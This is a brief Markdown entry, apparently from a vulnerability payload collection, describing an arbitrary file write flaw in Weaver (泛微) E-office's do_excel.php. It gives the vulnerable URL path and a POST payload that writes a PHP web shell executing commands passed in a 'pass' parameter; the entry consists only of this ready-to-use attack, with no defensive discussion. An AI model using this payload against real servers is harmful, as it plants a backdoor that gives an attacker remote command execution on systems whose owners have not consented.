## 泛微E-office do_excel.php任意文件写入漏洞

> URL
```
/WWW/general/charge/charge_list/do_excel.php
```

> Payload
```
html=<?php system($_POST[pass]);?>
```

